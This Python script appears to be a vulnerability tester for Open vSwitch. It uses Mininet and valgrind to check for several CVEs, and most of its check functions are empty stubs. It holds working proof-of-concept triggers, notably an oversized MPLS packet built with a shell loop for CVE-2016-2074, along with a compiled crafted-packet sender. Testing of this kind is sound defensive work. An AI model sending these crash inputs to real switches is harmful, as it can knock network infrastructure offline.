import os
import subprocess
import re
import ovs_config
from mininet.log import setLogLevel
from time import sleep
from mininet_setup import MininetNetwork

def cve_2016_2074():
    os.system('sudo ovs-vsctl add-br br0')
   
    mpls = 'sudo ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)'
    process = subprocess.Popen(mpls, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
    output, _ = process.communicate()

    os.system('sudo ovs-vsctl del-br br0')

    vulnerable = False
    if 'ovs-vswitchd: transaction error' in output:
        vulnerable = True

    return vulnerable

def cve_2016_10377():

    setLogLevel('info')
    os.system('gcc packets/cve_2016_10377.c -o packets/cve_2016_10377')

    log_path = ovs_config.start_valgrind('cve_2016_10377')

    mininet = MininetNetwork()
    mininet.mininet_2h_1s()

    #mininet.net['h2'].cmd('sudo wireshark -i h2-eth0 -k &')
    #sleep(5)
    mininet.net['h1'].cmd('./packets/cve_2016_10377')
    #sleep(10)

    #mininet.net['h2'].cmd('sudo killall wireshark')
    mininet.stop_mininet()
    mininet.cleanup_network()

    ovs_config.valgrind_cleanup()

    os.system('rm packets/cve_2016_10377')

    vulnerable = False
    with open(log_path, 'r') as log_file:
        log_content = log_file.read()
        error = re.compile(r'Uninitialised value was created by a stack allocation')
        if error.search(log_content):
            vulnerable = True

    return vulnerable

def cve_2017_9264():
    pass

def cve_2020_27827():
    pass

def cve_2020_35498():
    pass

def cve_2021_3905():
    pass

def cve_2022_4337():
    pass

def cve_2022_4338():
    pass

def cve_2022_32166():
    os.system('ovs-vsctl add-br br-int')
    os.system('ovs-ofctl add-flow br-int "table=0,cookie=0x1234,priority=10000,icmp,actions=drop"')
    os.system('ovs-ofctl --strict del-flows br-int "table=0,cookie=0x1234/-1,priority=10000"')

    os.system('ovs-vsctl del-br br-int')

def cve_2023_1668():
    pass

# This is for testing purposes:
if __name__ == '__main__':
    test = cve_2016_2074()
    #test = cve_2016_10377()
    #cve_2022_32166()
    print(test)
  